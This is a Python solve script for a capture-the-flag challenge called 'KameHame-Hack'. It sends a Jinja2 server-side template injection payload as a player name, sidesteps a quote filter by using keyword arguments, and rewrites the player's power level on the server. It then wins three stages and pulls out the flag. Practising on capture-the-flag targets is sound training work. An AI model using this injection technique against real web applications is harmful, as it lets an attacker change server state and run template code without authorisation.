#!/usr/bin/env python3
"""KameHame-Hack CTF Solve - Jinja2 SSTI via player.__dict__.update()"""

import requests

BASE = "http://chals1.apoorvctf.xyz:3001"
s = requests.Session()

# Register with SSTI payload that updates player.power_level to 9999999
# Key insight: quotes are filtered, so use keyword args instead of dict literals
payload = "{{player.__dict__.update(power_level=9999999) or player.name}}"
s.post(f"{BASE}/", data={"name": payload})

# Win all 3 stages (power 9999999 > all enemies including Jiren at 1000000)
for stage in range(1, 4):
    r = s.post(f"{BASE}/attack")
    print(f"Stage {stage}: {r.text}")

# Get flag from victory page
r = s.get(f"{BASE}/arena")
import re
flag = re.search(r'apoorvctf\{[^}]+\}', r.text)
if flag:
    print(f"\nFlag: {flag.group()}")
